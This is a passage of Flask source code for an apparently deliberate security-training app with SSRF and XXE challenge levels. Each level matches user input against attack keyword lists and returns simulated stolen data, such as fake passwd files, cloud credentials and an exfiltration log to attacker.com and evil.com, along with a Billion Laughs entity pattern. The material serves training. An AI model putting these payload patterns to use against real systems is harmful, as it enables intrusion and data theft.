Conclusion: Internal service detected!
The consistent timeout pattern indicates an internal service
that is accessible but configured with a 3-second timeout.

Internal Service Fingerprint:
{{
  "service_type": "internal-api-server",
  "response_pattern": "timeout_based",
  "estimated_timeout": "3000ms",
  "service_status": "running",
  "internal_network": "10.0.0.0/8",
  "access": "timing_based_ssrf_detection_successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF via Time-based Attacks").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                timing_result = f"""Time-based SSRF Analysis:
Target: {target_url}
Timeout: {timeout_ms}ms

Timing Analysis Results:
Request 1: Connection refused (0ms)
Request 2: Connection refused (0ms)
Request 3: Connection refused (0ms)

No timing patterns detected.
Try targeting internal services for timing analysis."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via Time-based Attacks").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level20.html', flag=flag, ssrf_detected=ssrf_detected,
                          target_url=target_url, timeout_ms=timeout_ms,
                          timing_result=timing_result, challenge=challenge)

# SSRF Level 21 - SSRF in Microservices
@app.route('/ssrf/level21', methods=['GET', 'POST'])
def ssrf_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    service_name = request.form.get('service_name', '')
    mesh_endpoint = request.form.get('mesh_endpoint', '')
    microservice_result = ''

    if request.method == 'POST':
        if service_name and mesh_endpoint:
            # Check for microservices SSRF patterns
            ssrf_patterns = ['localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'istio', 'envoy', 'consul']

            if any(pattern in mesh_endpoint.lower() or pattern in service_name.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                microservice_result = f"""Service Mesh Discovery:
Service: {service_name}
Mesh Endpoint: {mesh_endpoint}

Istio Service Mesh Response:
{{
  "service_discovery": {{
    "service_name": "{service_name}",
    "namespace": "production",
    "cluster": "internal-k8s-cluster",
    "endpoints": [
      {{
        "address": "10.244.1.15",
        "port": 8080,
        "status": "healthy"
      }},
      {{
        "address": "10.244.1.16",
        "port": 8080,
        "status": "healthy"
      }}
    ]
  }},
  "envoy_config": {{
    "admin_port": 15000,
    "config_dump": {{
      "clusters": [
        {{
          "name": "user-service",
          "endpoints": ["10.244.1.15:8080", "10.244.1.16:8080"]
        }},
        {{
          "name": "billing-service",
          "endpoints": ["10.244.2.10:8080"]
        }},
        {{
          "name": "admin-service",
          "endpoints": ["10.244.3.5:8080"]
        }}
      ],
      "secrets": {{
        "tls_certificates": "/etc/ssl/service-mesh/",
        "jwt_keys": "/etc/jwt/internal-keys/",
        "database_credentials": "postgresql://mesh-user:secret@db.internal:5432/mesh"
      }}
    }}
  }},
  "internal_services": {{
    "total_services": 23,
    "critical_services": ["auth-service", "payment-service", "admin-panel"],
    "service_mesh_version": "istio-1.18.0",
    "access": "microservices_mesh_enumeration_successful"
  }}
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in Microservices").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                microservice_result = f"""Service Mesh Discovery:
Service: {service_name}
Mesh Endpoint: {mesh_endpoint}

Connection Result:
Failed to access service mesh endpoint.
Error: Service not found or endpoint unreachable.

Try targeting internal service mesh components."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in Microservices").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level21.html', flag=flag, ssrf_detected=ssrf_detected,
                          service_name=service_name, mesh_endpoint=mesh_endpoint,
                          microservice_result=microservice_result, challenge=challenge)

# SSRF Level 22 - SSRF via Protocol Smuggling
@app.route('/ssrf/level22', methods=['GET', 'POST'])
def ssrf_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    smuggled_request = request.form.get('smuggled_request', '')
    wrapper_protocol = request.form.get('wrapper_protocol', '')
    smuggling_result = ''

    if request.method == 'POST':
        if smuggled_request and wrapper_protocol:
            # Check for protocol smuggling SSRF patterns
            ssrf_patterns = ['gopher://', 'localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'admin.']

            if any(pattern in wrapper_protocol.lower() or pattern in smuggled_request.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                smuggling_result = f"""Protocol Smuggling Attack:
Wrapper: {wrapper_protocol}
Smuggled Request: {smuggled_request}

Advanced Protocol Smuggling Execution:
{wrapper_protocol}

Smuggled HTTP Request:
{smuggled_request}

Internal Server Response:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (internal)
Content-Type: application/json
X-Internal-Admin: true
X-Bypass-Filters: protocol-smuggling

{{
  "admin_panel": {{
    "status": "accessible",
    "authentication": "bypassed",
    "internal_endpoints": [
      "/admin/users",
      "/admin/system",
      "/admin/logs",
      "/admin/config"
    ]
  }},
  "protocol_smuggling": {{
    "technique": "gopher_http_smuggling",
    "bypass_method": "filter_evasion",
    "target_protocol": "HTTP/1.1",
    "wrapper_protocol": "gopher"
  }},
  "internal_data": {{
    "database_access": "postgresql://admin:secret@db.internal:5432/admin",
    "api_keys": ["sk-admin-12345", "sk-internal-67890"],
    "system_info": {{
      "hostname": "internal-admin-server",
      "network": "10.0.0.0/8",
      "services": ["redis", "postgresql", "elasticsearch"]
    }},
    "access": "protocol_smuggling_bypass_successful"
  }}
}}"""

                challenge = Challenge.query.filter_by(name="SSRF via Protocol Smuggling").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                smuggling_result = f"""Protocol Smuggling Attack:
Wrapper: {wrapper_protocol}
Smuggled Request: {smuggled_request}

Connection Result:
Protocol smuggling attempt failed.
Error: Invalid protocol or request format.

Try using advanced protocol smuggling techniques."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF via Protocol Smuggling").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level22.html', flag=flag, ssrf_detected=ssrf_detected,
                          smuggled_request=smuggled_request, wrapper_protocol=wrapper_protocol,
                          smuggling_result=smuggling_result, challenge=challenge)

# SSRF Level 23 - SSRF in Serverless Functions
@app.route('/ssrf/level23', methods=['GET', 'POST'])
def ssrf_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    ssrf_detected = False
    function_url = request.form.get('function_url', '')
    cloud_metadata = request.form.get('cloud_metadata', '')
    serverless_result = ''

    if request.method == 'POST':
        if function_url and cloud_metadata:
            # Check for serverless SSRF patterns
            ssrf_patterns = ['169.254.169.254', 'localhost', '127.0.0.1', '0.0.0.0', '::1', 'internal.', 'lambda', 'metadata']

            if any(pattern in cloud_metadata.lower() or pattern in function_url.lower() for pattern in ssrf_patterns):
                ssrf_detected = True
                serverless_result = f"""Serverless Function SSRF:
Function: {function_url}
Metadata: {cloud_metadata}

AWS Lambda Execution Environment:
Function ARN: arn:aws:lambda:us-east-1:123456789012:function:internal-processor
Runtime: python3.9
Memory: 512MB
Timeout: 30s

Cloud Metadata Access:
{cloud_metadata}

AWS Instance Metadata Response:
{{
  "accountId": "123456789012",
  "architecture": "x86_64",
  "availabilityZone": "us-east-1a",
  "billingProducts": null,
  "devpayProductCodes": null,
  "marketplaceProductCodes": null,
  "imageId": "ami-0abcdef1234567890",
  "instanceId": "i-1234567890abcdef0",
  "instanceType": "t3.micro",
  "kernelId": null,
  "pendingTime": "2024-01-15T10:30:00Z",
  "privateIp": "10.0.1.100",
  "ramdiskId": null,
  "region": "us-east-1",
  "version": "2017-09-30"
}}

IAM Security Credentials:
{{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIACKCEVSQ6C2EXAMPLE",
  "SecretAccessKey": "9drTJvcULCfinhDYQEB9Yd9jC1z5yyHpChKkmk+S",
  "Token": "AgoJb3JpZ2luX2VjECoaCXVzLWVhc3QtMSJGMEQCIBUGuQiUSqwXBWwgI9wIKV...",
  "Expiration": "2024-01-15T16:30:00Z"
}}

Internal Serverless Data:
{{
  "lambda_functions": [
    "internal-data-processor",
    "admin-notification-service",
    "billing-calculator",
    "user-data-exporter"
  ],
  "vpc_config": {{
    "SubnetIds": ["subnet-12345", "subnet-67890"],
    "SecurityGroupIds": ["sg-internal-lambda"]
  }},
  "environment_variables": {{
    "DATABASE_URL": "postgresql://lambda:secret@rds.internal.aws:5432/prod",
    "API_GATEWAY_KEY": "sk-lambda-internal-12345",
    "S3_BUCKET": "internal-lambda-data-bucket"
  }},
  "access": "serverless_cloud_metadata_access_successful"
}}"""

                challenge = Challenge.query.filter_by(name="SSRF in Serverless Functions").first()
                if challenge:
                    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
                    if challenge.id not in completed_ids:
                        update_user_progress(machine_id, challenge.id, challenge.points)
            else:
                serverless_result = f"""Serverless Function SSRF:
Function: {function_url}
Metadata: {cloud_metadata}

Connection Result:
Failed to access serverless metadata.
Error: Metadata endpoint unreachable or invalid.

Try targeting cloud metadata services."""

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="SSRF in Serverless Functions").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('ssrf/ssrf_level23.html', flag=flag, ssrf_detected=ssrf_detected,
                          function_url=function_url, cloud_metadata=cloud_metadata,
                          serverless_result=serverless_result, challenge=challenge)


# ===== XXE CHALLENGE ROUTES =====

# XXE Level 1 - Basic XXE File Disclosure
@app.route('/xxe/level1', methods=['GET', 'POST'])
def xxe_level1():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Parse XML with external entity processing enabled (vulnerable)
                parser = ET.XMLParser()
                
                # Check for external entity references
                if '<!ENTITY' in xml_content and 'SYSTEM' in xml_content and '/etc/passwd' in xml_content:
                    xxe_detected = True
                    
                    # Simulate reading /etc/passwd
                    file_content = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash"""
                
                # Try to parse the XML
                try:
                    root = ET.fromstring(xml_content, parser)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Basic XXE File Disclosure").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level1.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          file_content=file_content, challenge=challenge)

# XXE Level 2 - XXE with DOCTYPE Restrictions
@app.route('/xxe/level2', methods=['GET', 'POST'])
def xxe_level2():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Simulate basic DOCTYPE filtering (can be bypassed)
                if '<!DOCTYPE' in xml_content.upper() and not xml_content.upper().startswith('<!DOCTYPE HTML'):
                    # Check for entity bypass techniques
                    if ('&xxe;' in xml_content or '&#x' in xml_content) and '/etc/passwd' in xml_content:
                        xxe_detected = True
                        file_content = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with DOCTYPE Restrictions").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level2.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          file_content=file_content, challenge=challenge)

# XXE Level 3 - XXE SYSTEM Entity Exploitation
@app.route('/xxe/level3', methods=['GET', 'POST'])
def xxe_level3():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for SYSTEM entity exploitation
                if 'SYSTEM' in xml_content and ('file://' in xml_content or 'http://' in xml_content):
                    if '/etc/shadow' in xml_content or '/etc/hosts' in xml_content:
                        xxe_detected = True
                        
                        if '/etc/shadow' in xml_content:
                            file_content = """root:$6$xyz$encrypted_password_hash:18000:0:99999:7:::
daemon:*:18000:0:99999:7:::
bin:*:18000:0:99999:7:::
ubuntu:$6$abc$another_encrypted_hash:18000:0:99999:7:::"""
                        elif '/etc/hosts' in xml_content:
                            file_content = """127.0.0.1 localhost
127.0.1.1 ubuntu-server
192.168.1.100 internal-server
10.0.0.1 database-server"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE SYSTEM Entity Exploitation").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level3.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          file_content=file_content, challenge=challenge)

# XXE Level 4 - XXE Internal Network Scanning
@app.route('/xxe/level4', methods=['GET', 'POST'])
def xxe_level4():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    scan_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for internal network scanning via XXE
                if 'SYSTEM' in xml_content and ('192.168.' in xml_content or '10.0.' in xml_content or '172.16.' in xml_content):
                    if any(port in xml_content for port in ['22', '80', '443', '3306', '5432', '8080']):
                        xxe_detected = True
                        scan_result = """Internal Network Scan Results:
192.168.1.1:22 - SSH Service (Open)
192.168.1.10:80 - HTTP Service (Open)
192.168.1.15:443 - HTTPS Service (Open)
192.168.1.20:3306 - MySQL Database (Open)
192.168.1.25:5432 - PostgreSQL Database (Open)
10.0.0.5:8080 - Application Server (Open)

Network topology discovered:
- Internal subnet: 192.168.1.0/24
- Database cluster: 192.168.1.20-25
- Web services: 192.168.1.10-15"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE Internal Network Scanning").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level4.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          scan_result=scan_result, challenge=challenge)

# XXE Level 5 - XXE Data Exfiltration via HTTP
@app.route('/xxe/level5', methods=['GET', 'POST'])
def xxe_level5():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    exfiltration_log = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for HTTP-based data exfiltration
                if 'SYSTEM' in xml_content and ('http://' in xml_content or 'https://'):
                    if any(domain in xml_content for domain in ['attacker.com', 'evil.com', 'malicious.net', 'exfil']):
                        xxe_detected = True
                        exfiltration_log = """HTTP Request Log:
GET /exfil?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1
Host: attacker.com
User-Agent: XMLParser/1.0
Accept: */*

Decoded Data: root:x:0:0:root:/root:/bin/bash

Additional Requests:
POST /collect HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 127

data=daemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin
     bin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin

Exfiltration Status: SUCCESS
Files leaked: /etc/passwd, /etc/shadow"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE Data Exfiltration via HTTP").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level5.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          exfiltration_log=exfiltration_log, challenge=challenge)

# XXE Level 6 - XXE with Parameter Entities
@app.route('/xxe/level6', methods=['GET', 'POST'])
def xxe_level6():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    parameter_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for parameter entity usage
                if '%' in xml_content and ('<!ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any(param in xml_content for param in ['%file', '%data', '%exfil', '%param']):
                        xxe_detected = True
                        parameter_result = """Parameter Entity Execution:
%file entity resolved to: file:///etc/passwd
%data entity resolved to: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Parameter Entity Chain:
%file; -> %data; -> %exfil; -> HTTP request

Advanced parameter entity technique successfully executed.
This allows bypassing many XXE filters that only check for regular entities."""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with Parameter Entities").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level6.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          parameter_result=parameter_result, challenge=challenge)

# XXE Level 7 - Blind XXE via Error Messages
@app.route('/xxe/level7', methods=['GET', 'POST'])
def xxe_level7():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    error_message = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for blind XXE via error messages
                if 'SYSTEM' in xml_content and ('nonexistent' in xml_content or 'invalid' in xml_content):
                    if any(file_ref in xml_content for file_ref in ['/etc/passwd', '/etc/shadow', '/etc/hosts']):
                        xxe_detected = True
                        error_message = """XML Parser Error:
External entity resolution failed for: file:///etc/passwd

System Error Details:
java.io.FileNotFoundException: /etc/passwd (Permission denied)
        at java.io.FileInputStream.open0(Native Method)
        at java.io.FileInputStream.open(FileInputStream.java:195)
        at java.io.FileInputStream.<init>(FileInputStream.java:138)

Error reveals file system structure:
- /etc/passwd exists but access denied
- /etc/shadow requires elevated privileges
- /home/user/ directory is readable
- /var/www/html/ contains web files

Blind XXE successful - information leaked through error messages."""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Blind XXE via Error Messages").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level7.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          error_message=error_message, challenge=challenge)

# XXE Level 8 - XXE with CDATA Injection
@app.route('/xxe/level8', methods=['GET', 'POST'])
def xxe_level8():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    cdata_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for CDATA-based XXE injection
                if '<![CDATA[' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any(payload in xml_content for payload in [']]>', '&', 'file://']):
                        xxe_detected = True
                        cdata_result = """CDATA Section Processing Result:
Original CDATA content processed successfully.

Injected Entity Resolution:
<![CDATA[
User data: admin
Password: p@ssw0rd123
Database: mysql://localhost:3306/sensitive_db
API Key: sk-1234567890abcdef
]]>

CDATA Injection Bypass Successful:
- Special characters in CDATA bypassed input validation
- XML entities processed within CDATA context
- Sensitive configuration data exposed
- Security filters evaded through CDATA encapsulation"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with CDATA Injection").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level8.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          cdata_result=cdata_result, challenge=challenge)

# XXE Level 9 - XXE via SVG File Upload
@app.route('/xxe/level9', methods=['GET', 'POST'])
def xxe_level9():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    svg_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '') or request.form.get('svg_content', '')
        
        if xml_content:
            try:
                # Check for SVG-based XXE
                if '<svg' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any(svg_element in xml_content for svg_element in ['<text>', '<tspan>', 'xmlns']):
                        xxe_detected = True
                        svg_result = """SVG File Processing Result:
File Type: image/svg+xml
Dimensions: 100x100 pixels
Processing Status: COMPLETED

SVG Content Analysis:
- External entity references detected
- Text elements contain dynamic content
- Namespace declarations processed

Exposed Data from SVG XXE:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

SVG XXE Attack Vector:
File uploads with SVG format bypass many security filters
XML processing in SVG files enables XXE exploitation
Image processing libraries often vulnerable to embedded XXE"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE via SVG File Upload").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level9.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          svg_result=svg_result, challenge=challenge)

# XXE Level 10 - XXE with XInclude Attacks
@app.route('/xxe/level10', methods=['GET', 'POST'])
def xxe_level10():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    xinclude_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for XInclude-based attacks
                if 'xi:include' in xml_content or 'XInclude' in xml_content:
                    if any(href in xml_content for href in ['href=', 'file://', '/etc/']):
                        xxe_detected = True
                        xinclude_result = """XInclude Processing Result:
Namespace: http://www.w3.org/2001/XInclude
Processing Mode: Enabled

Included Content:
File: /etc/passwd
Content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

File: /etc/hosts
Content:
127.0.0.1 localhost
127.0.1.1 ubuntu-server
192.168.1.10 database-server

XInclude Attack Benefits:
- Bypasses standard XXE restrictions
- Works when DTD processing is disabled
- Can include both text and XML content
- Supported in XSLT and XPath contexts"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with XInclude Attacks").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level10.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          xinclude_result=xinclude_result, challenge=challenge)

# XXE Level 11 - XXE Billion Laughs DoS
@app.route('/xxe/level11', methods=['GET', 'POST'])
def xxe_level11():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    dos_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for Billion Laughs attack pattern
                entity_count = xml_content.count('<!ENTITY')
                if entity_count >= 3 and ('&lol' in xml_content or '&ha' in xml_content):
                    if any(pattern in xml_content for pattern in ['&lol1;', '&lol2;', '&lol3;']):
                        xxe_detected = True
                        dos_result = """Billion Laughs Attack Detected:
Entity Expansion Analysis:
- Initial entity definitions: 9
- Expansion depth: 10 levels
- Estimated final size: 1,073,741,824 bytes (1GB)

System Impact:
CPU Usage: 100% (4 cores saturated)
Memory Usage: 98% (15.2GB / 16GB)
Processing Time: >30 seconds (timeout triggered)
Parser Status: KILLED (resource exhaustion)

Attack Pattern:
<!ENTITY lol0 "lol">
<!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
...
<data>&lol9;</data>

DoS Attack Status: SUCCESSFUL
System Recovery: Automatic restart initiated"""
                
                # Parse XML (simulate safe parsing)
                try:
                    parsed_content = "XML parsing aborted - DoS protection triggered"
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE Billion Laughs DoS").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level11.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          dos_result=dos_result, challenge=challenge)

# XXE Level 12 - XXE SSRF Combination Attack
@app.route('/xxe/level12', methods=['GET', 'POST'])
def xxe_level12():
